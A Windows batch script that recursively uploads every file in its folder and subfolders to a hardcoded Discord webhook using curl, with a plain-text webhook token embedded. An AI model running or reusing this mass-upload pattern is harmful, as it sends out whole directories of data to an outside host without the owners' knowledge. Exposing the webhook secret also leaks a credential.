@echo off
setlocal enabledelayedexpansion

:: Define the webhook URL
set "WEBHOOK_URL=https://discord.com/api/webhooks/1511832980744835074/UVIFIzLHMBWkw2f2llrb5UQI43RQ4LpkmdAyBYxH2fiB91N0Jm07QxA_6oD1aTol7Be9"

:: Change the current directory to the exact folder where this script is saved
cd /d "%~dp0"

:: Loop recursively (/R) through all files in this folder AND all of its subfolders
for /R %%F in (*) do (
    if exist "%%F" (
        
        :: Safety Check: Do NOT upload this script itself
        if not "%%F"=="%~f0" (
            echo Sending: %%~nxF
            
            :: Send the file using curl via a multipart/form-data POST request
            curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%%F" "%WEBHOOK_URL%"
            
            :: Optional: Add a brief delay between uploads to respect API rate limits
            timeout /t 1 >nul
        )
    )
)

echo All tasks processed.
pause
